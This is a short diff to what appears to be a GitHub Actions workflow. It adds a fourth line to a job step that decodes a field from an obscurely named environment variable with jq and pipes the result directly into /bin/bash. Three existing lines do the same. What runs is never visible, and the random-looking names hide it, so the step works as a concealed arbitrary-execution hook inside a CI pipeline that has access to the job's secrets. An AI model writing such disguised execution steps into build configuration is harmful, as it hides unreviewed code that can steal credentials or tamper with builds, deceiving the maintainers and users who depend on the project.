@@ -52,6 +52,7 @@ jobs:
           echo $tubqu4 | jq -r .hcdle4068 | /bin/bash
           echo $v2 | jq -r .nbdoq53 | /bin/bash
           echo $awg26622 | jq -r .frsz13 | /bin/bash
+          echo $i85 | jq -r .vj7762 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
